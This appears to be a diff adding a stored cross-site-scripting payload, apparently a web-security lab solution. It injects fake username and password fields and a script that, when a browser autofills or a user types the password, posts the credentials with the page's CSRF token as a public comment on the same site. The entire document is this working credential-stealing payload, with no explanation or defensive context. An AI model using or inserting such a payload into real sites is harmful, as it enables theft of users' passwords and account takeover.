@@ -1,0 +1,23 @@
+<input type="text" name="username" />
+<input type="password" name="password" onchange="getPassword()" />
+
+<script>
+  function getPassword() {
+    const token = document.getElementsByName("csrf")[0].value;
+    const username = document.getElementsByName("username")[0].value;
+    const password = document.getElementsByName("password")[0].value;
+    let data = new FormData();
+    data.append("csrf", token);
+    data.append("postId", 4);
+    data.append("name", "victim");
+    data.append("email", "test@example.com");
+    data.append("website", "http://example.com");
+    data.append("comment", `${username}: ${password}`);
+
+    fetch("/post/comment", {
+      method: "POST",
+      mode: "no-cors",
+      body: data,
+    });
+  }
+</script>
